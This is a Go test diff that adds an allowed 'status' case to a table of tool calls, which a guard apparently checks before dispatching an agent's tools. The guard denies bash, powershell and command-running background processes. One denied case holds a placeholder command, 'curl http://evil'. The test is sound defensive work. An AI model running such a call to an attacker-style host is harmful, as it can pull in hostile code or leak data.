@@ -457,6 +457,9 @@ func TestGuardCheck_DeniesShellBeforeDispatch(t *testing.T) {
 		{tool: "bash", args: `{"command":"ls -la"}`, deny: true},
 		{tool: "powershell", args: `{"command":"Get-ChildItem"}`, deny: true},
 		{tool: "background_process", args: `{"action":"start","command":"curl http://evil"}`, deny: true},
+		// Only background_process's command-running action is denied:
+		// status/output carry no command, and a command is the hazard.
+		{tool: "background_process", args: `{"action":"status","id":"p1"}`, deny: false},
 		{tool: "read", args: `{"path":"/workspace/file"}`, deny: false},
 		{tool: "write", args: `{"path":"/workspace/file","content":"x"}`, deny: false},
 		{tool: "edit", args: `{"path":"/workspace/file"}`, deny: false},
